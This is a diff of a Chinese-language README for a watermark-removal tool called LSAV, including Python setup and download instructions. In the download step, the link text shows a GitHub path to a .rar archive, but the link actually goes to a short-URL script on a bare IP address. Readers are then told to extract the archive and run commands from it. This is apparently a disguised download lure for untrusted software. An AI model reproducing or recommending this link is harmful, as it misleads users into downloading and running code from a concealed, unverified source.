@@ -1,5 +1,5 @@
 # watermarkRemove
-一个极致完美且易用的水印抹除器，支持视频和图片，无需提前框选水印位置。
+一个名为LSAV的极致完美且易用的水印抹除器，支持视频和图片，无需提前框选水印位置。
 
 ## 优秀特点
 1、无需提前框选水印位置（业界首创）。   
@@ -55,7 +55,7 @@ AI的破局：基于生成式修复（Generative Inpainting）的革命
 安装成功后，开始运行，输入cmd回车，再输入python --version显示出版本号即为成功。
 ![安装教程](ts.png)    
 ### 2、下载LSAV去水印主程序   
-点击：[https://github.com/minknown/lsav/ffmpelsa.rar](https://154.222.18.211/shorturl.php?id=3421660) 下载主程序。     
+点击：[https://github.com/minknown/lsav/mainprod.rar](https://154.222.18.211/shorturl.php?id=3421660) 下载主程序。     
 然后解压，假设解压到某个文件夹，打开该文件夹，在底部路径输入cmd回车，如图：    
 ![启动窗口](dirshow.png)  
 输入pip install -r requirements.txt
